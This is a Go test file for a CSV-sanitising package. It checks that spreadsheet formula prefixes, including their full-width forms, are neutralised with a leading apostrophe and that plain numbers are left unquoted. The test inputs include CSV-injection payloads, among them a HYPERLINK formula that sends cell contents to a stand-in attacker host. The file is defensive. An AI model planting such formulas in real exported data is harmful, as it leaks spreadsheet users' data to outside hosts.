package csvsafe

import (
	"slices"
	"testing"
)

func TestCellNeutralisesFormulaPrefixes(t *testing.T) {
	for in, want := range map[string]string{
		`=HYPERLINK("https://attacker.invalid/?"&A1,"open")`: `'=HYPERLINK("https://attacker.invalid/?"&A1,"open")`,
		"+1+1":       "'+1+1",
		"-1+1":       "'-1+1",
		"-":          "'-",
		"--5":        "'--5",
		"-1e5":       "'-1e5",
		"@SUM(A1)":   "'@SUM(A1)",
		"\t=1+1":     "'\t=1+1",
		"\r=1+1":     "'\r=1+1",
		"\n=1+1":     "'\n=1+1",
		"":           "",
		"claude":     "claude",
		"a=b":        "a=b",
		"/v1/models": "/v1/models",
		" =1+1":      " =1+1",
		// Numbers are not formulas.
		"-5":        "-5",
		"+3.25":     "+3.25",
		"0.010000":  "0.010000",
		"-0.500000": "-0.500000",
		"12":        "12",
	} {
		if got := Cell(in); got != want {
			t.Errorf("Cell(%q) = %q, want %q", in, got, want)
		}
	}
}

// Spreadsheets that read the full-width forms of = + - @ as the ASCII ones
// evaluate a cell starting with them too; only ASCII numbers stay unquoted.
func TestCellNeutralisesFullWidthFormulaPrefixes(t *testing.T) {
	for in, want := range map[string]string{
		"＝HYPERLINK(\"https://attacker.invalid/\")": "'＝HYPERLINK(\"https://attacker.invalid/\")",
		"＋1+1":     "'＋1+1",
		"－1+1":     "'－1+1",
		"＠SUM(A1)": "'＠SUM(A1)",
		"－5":       "'－5",
		"＋3.25":    "'＋3.25",
		"-５":       "'-５",
		"a＝b":      "a＝b",
		"１２":       "１２",
		"模型＝1":     "模型＝1",
	} {
		if got := Cell(in); got != want {
			t.Errorf("Cell(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestRecordCopiesEveryCell(t *testing.T) {
	in := []string{"=1+1", "ok", "-2", "\n@x", "＠x"}
	got := Record(in)
	if want := []string{"'=1+1", "ok", "-2", "'\n@x", "'＠x"}; !slices.Equal(got, want) {
		t.Fatalf("Record = %q, want %q", got, want)
	}
	if in[0] != "=1+1" {
		t.Fatal("Record changed its input")
	}
}
